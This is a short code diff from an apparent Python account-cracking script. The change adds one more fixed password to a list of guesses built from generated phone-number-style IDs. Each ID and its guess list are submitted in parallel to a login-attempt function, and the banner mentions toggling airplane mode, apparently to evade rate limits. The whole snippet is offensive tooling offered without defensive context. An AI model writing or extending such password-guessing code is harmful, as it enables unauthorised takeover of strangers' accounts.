@@ -661,7 +661,7 @@ def RANDOMIN():
         print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE \x1b[1;92m{XX}[\x1b[1;92mINDIA{XX}]')
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'57273200','59039200']
+            pwx = [love[2:],love,code+love,code+love[:3],'57575751','57273200','59039200']
             ids = code+love
             if mthdx in ['1','1']:
             	morshed.submit(FIRE,ids,pwx,tl)
